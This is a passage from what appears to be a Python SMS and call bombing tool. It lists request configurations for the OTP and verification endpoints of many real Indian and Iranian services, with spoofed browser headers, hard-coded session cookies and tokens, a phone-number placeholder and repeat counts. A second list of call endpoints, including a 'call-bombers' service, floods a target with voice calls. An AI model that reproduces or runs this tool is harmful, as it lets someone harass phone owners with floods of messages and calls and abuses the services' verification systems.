            "Cookie": "_gcl_au=1.1.994375249.1719049925; _ga=GA1.1.2131701644.1719049925; _ga_Q8HTW71CLJ=GS1.1.1719049925.1.1.1719049936.49.0.0; _ga_BLPG4SY73M=GS1.1.1719049925.1.1.1719049944.41.0.0; _ga_E0K0Q2R7S0=GS1.1.1719049925.1.1.1719049944.0.0.0",
            "Origin": "https://hourlyrooms.co.in",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "access-control-allow-credentials": "true",
            "access-control-allow-origin": "*",
            "content-type": "application/json",
            "platform": "web-2.0.0",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 1
    },
{
        "url": "https://api.madrasmandi.in/api/v1/auth/otp",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryBBzDmO8qIRlvPMMZ",
            "delivery-type": "instant",
            "mm-build-version": "1.0.1",
            "mm-device-type": "web",
            "origin": "https://madrasmandi.in",
            "priority": "u=1, i",
            "referer": "https://madrasmandi.in/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f'------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+91{phone}\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="scope"\r\n\r\nclient\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ--\r\n',
        "count": 3
    },
{
        "url": "https://www.bharatloan.com/login-sbm",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "ci_session=2s7ip3dak5aif2ka77sd2bn9i4nluq2h; _ga=GA1.1.963974262.1718969064; _gcl_au=1.1.1625156903.1718969064; _fbp=fb.1.1718969073282.994122455798043230; _ga_EWGNR5NDJB=GS1.1.1718969063.1.1.1718969167.41.0.0",
            "Origin": "https://www.bharatloan.com",
            "Referer": "https://www.bharatloan.com/apply-now",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"mobile={phone}&current_page=login&is_existing_customer=2",
        "count": 50
    },
{
        "url": "https://api.pagarbook.com/api/v5/auth/otp/request",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "appversioncode": "5268",
            "clientbuildnumber": "5268",
            "clientplatform": "WEB",
            "content-type": "application/json",
            "origin": "https://web.pagarbook.com",
            "priority": "u=1, i",
            "referer": "https://web.pagarbook.com/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "userrole": "EMPLOYER"
        },
        "data": lambda phone: json.dumps({"phone": phone, "language": 1}),
        "count": 5
    },
{
        "url": "https://api.vahak.in/v1/u/o_w",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.vahak.in",
            "priority": "u=1, i",
            "referer": "https://www.vahak.in/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone, "scope": 0, "request_meta_data": "X0oLFl9sAAZzHuhTmaHk5Bbd+HFZDh+P9J6JhPghG2V1Ymi6OPEu0TH1vS2J2tc58KI/YpjG5tiqVlDkbBCMQCneV7fXtTsYRjhF8FfVNac=", "is_whatsapp": False}),
        "count": 1
    },
{
        "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://redcliffelabs.com",
            "priority": "u=1, i",
            "referer": "https://redcliffelabs.com/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone, "short": True}),
        "count": 1
    },
{
        "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "apikey": "ixiweb\u00212$",
            "clientid": "ixiweb",
            "content-type": "application/x-www-form-urlencoded",
            "cookie": "__cf_bm=FdtmIxlX4PNfSpwYX1qvSdA99iOf9abzGUc7BSSoACw-1715442021-1.0.1.1-74e8P2QKatyvbBQjT7F7nqmbRS2wUmHIqJgmxxVi52EciJqdP_sqwydnwciOjrV8mWhS6v8d2XeMCAckwcbGzA; ixiUID=dc8e7b027263440b83a8; ixiSrc=3J4Sv1FzWiz+BBr0b5qy7LAESHlzQ1ym3JiFkuSC7S5GBZftf5jJ+0yO8gbj/stz5lWZnyT8gvEVf83M6I4pxA==; ixigoSrc=dc8e7b027263440b83a8|DIR:11052024|DIR:11052024|DIR:11052024; _gcl_au=1.1.78477619.1715442051; _ga=GA1.1.92728914.1715442053; _ym_uid=1715442054910529504; _ym_d=1715442054; _ym_isad=2; _ga_LJX9T6MDKX=GS1.1.1715442052.1.1.1715442087.25.0.1092021780; WZRK_G=dd46574995934bd09d3eef419c5501fe; WZRK_S_R5Z-849-WZ4Z=%7B%22p%22%3A1%2C%22s%22%3A1715442104%2C%22t%22%3A1715442223%7D",
            "deviceid": "dc8e7b027263440b83a8",
            "devicetime": "1715442205998",
            "gauth": "0.37EEF3ifZtJrSlsXYM3Jh31RMw1-QXORNR98Jtxx7eFsy48fe3rtoB6fTsPrhJKj9iIq25m-6BK30NAitgfSHcRQ8D9FSVzyFc4Rk4hNYn3Cj7EgBiIaPiIX1UyBrSdNM9p9WYpGH-ijc23okhxAZRhzx_BsPuyU3cPdgDjg1jAIAG_AOYxDZYSDjXBn7wDGv7sak0a4zCLwDef2PT5-pI0ecNnyLKEpNnFUg5O9955k_KjT8g0KuijkxQzMjQTMiqN917tCfcMDaZG1oYmcJjHU7eNxVwrsspE7YKEtrRXW58GAUJdhyFq95PmryvpLcDb3XxFwRw1R_YQgvCHyhPuaiw3WKrXR2Lq_XAgyz4eqv9gLGnSETFQ31dmAfPLcluZow_F7FwEJ_MNK5Q-m7YtO3UHRXMFogYOHtRixfHNu5uptz-tel8SXi414WDyX3VMftHjLgd7IUPaljlOASQ.3JCfm9KSGd3dfmd60LLg2A.fa41f75bb9ec89c96f7f89193863715eef60f7b71dc2d2846ce7de61449ecc4d",
            "ixisrc": "3J4Sv1FzWiz+BBr0b5qy7LAESHlzQ1ym3JiFkuSC7S5GBZftf5jJ+0yO8gbj/stz5lWZnyT8gvEVf83M6I4pxA",
            "origin": "https://www.ixigo.com",
            "priority": "u=1, i",
            "referer": "https://www.ixigo.com/?loginVisible=true",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "uuid": "dc8e7b027263440b83a8"
        },
        "data": lambda phone: f"sixDigitOTP=true&token=1f94cd26e6ace46d55cb10f0f72d29a0c080a14bdfb366d3c549f5000ce0898e514f9bc240f1b66fbf3cb97b65b74665f991767172e62de48edd47e98421d270&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone={phone}",
        "count": 1
    }
,
{
    "url": "https://janebi.com/signin?do",
    "method": "POST",
    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
    "data": lambda phone: f'resend=0{phone}',
    "count": 5
},
{
    "url": "https://igame.ir/api/play/otp/send",
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "data": lambda phone: json.dumps({'phone': '0' + phone}),
    "count": 5
},
{
    "url": "https://chechilas.com/user/login",
    "method": "POST",
    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
    "data": lambda phone: f'mob=0{phone}',
    "count": 5
},
{
    "url": "https://api.elinorboutique.com/v1/customer/register-login",
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "data": lambda phone: json.dumps({'mobile': '0' + phone}),
    "count": 5
},
{
    "url": "https://ubike.ir/index.php?route=extension/module/websky_otp/send_code",
    "method": "POST",
    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
    "data": lambda phone: f'telephone=0{phone}',
    "count": 5
},
{
    "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "data": lambda phone: json.dumps({'cellphone': '0' + phone}),
    "count": 5
},
{
    "url": "https://api.digighate.com/v2/public/code?phone={phone}",
    "method": "GET",
    "headers": {},
    "data": None,
    "count": 5
},
{
    "url": "https://www.kanoonbook.ir/store/customer_otp",
    "method": "POST",
    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
    "data": lambda phone: f'customer_username={phone}&task=customer_phone',
    "count": 5
},
{
    "url": "https://sso-service.ketab.ir/api/v2/signup/otp?Mobile=0{phone}&OtpSmsType=1",
    "method": "GET",
    "headers": {},
    "data": None,
    "count": 5
}

call_apis = [
    {
        "url": "https://call-bombers.vercel.app/send-call",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"key": "Gift By DH Alamin", "number": phone, "repeat": "1"}),
        "count": 1
    },
    {
        "url": "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/{phone}?callType=otpOnCall",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 1
    },
    {
        "url": "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"action_id=call_to_otp&mob_num={phone}&member_id=1547045",
        "count": 1
    },
    {
        "url": "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile={phone}",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 1
    },
    {
        "url": "https://www.careers360.com/ajax/no-cache/user/otp-send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile_number={phone}&method=call&uid=12692588",
        "count": 1
    },
    {
        "url": "https://torob.com/v4/user/phone/send-voice-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"phone_number": f"0{phone}"}),
        "count": 1
    }
]

